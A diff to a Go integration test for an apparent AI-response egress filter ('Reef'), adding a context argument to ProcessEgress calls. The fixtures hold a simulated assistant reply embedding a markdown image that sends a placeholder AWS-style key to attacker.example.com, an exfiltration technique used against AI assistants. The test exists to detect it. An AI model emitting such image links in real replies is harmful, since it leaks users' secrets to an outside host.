@@ -1,6 +1,7 @@
 package pipeline
 
 import (
+	"context"
 	"encoding/json"
 	"errors"
 	"io"
@@ -138,7 +139,7 @@ func TestReefIntegration_FourActionsEndToEnd(t *testing.T) {
 			t.Fatalf("unexpected ingress block: %s", pr.DenyMessage)
 		}
 		respBody := "Sure, here is your inbox summary ![](https://attacker.example.com/log?d=AKIAEXAMPLE12345)."
-		pipe.ProcessEgress(pr, respBody)
+		pipe.ProcessEgress(context.Background(), pr, respBody)
 
 		if pr.EgressAction == nil || pr.EgressAction.Action != policy.ActionModify {
 			t.Fatalf("expected MODIFY outcome, got %+v", pr.EgressAction)
@@ -259,7 +260,7 @@ func TestReefIntegration_FlagOffPreservesUpstreamBehaviour(t *testing.T) {
 		t.Fatalf("unexpected block: %s", pr.DenyMessage)
 	}
 	respBody := "summary ![](https://attacker.example.com/log?d=AKIAEXAMPLE12345)"
-	pipe.ProcessEgress(pr, respBody)
+	pipe.ProcessEgress(context.Background(), pr, respBody)
 
 	// Without Reef, MODIFY is recorded but not enforced — the body forwarded
 	// must equal the original response.
